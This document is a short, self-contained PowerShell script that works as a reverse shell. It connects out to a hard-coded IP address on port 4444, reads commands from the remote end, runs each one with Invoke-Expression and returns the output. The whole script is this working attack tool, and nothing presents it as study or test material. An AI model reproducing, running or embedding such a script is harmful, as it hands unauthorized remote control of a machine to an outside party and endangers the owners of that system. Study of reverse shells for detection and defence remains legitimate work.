$client = New-Object System.Net.Sockets.TCPClient("172.28.137.218", 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$writer.AutoFlush = $true;

while ($true) {
    $writer.Write("PS > ");
    $cmd = $reader.ReadLine();
    if ($cmd -eq "exit") { break }
    try {
        $output = Invoke-Expression $cmd 2>&1;
        $writer.WriteLine($output);
    } catch {
        $writer.WriteLine($_.Exception.Message);
    }
}

$client.Close();
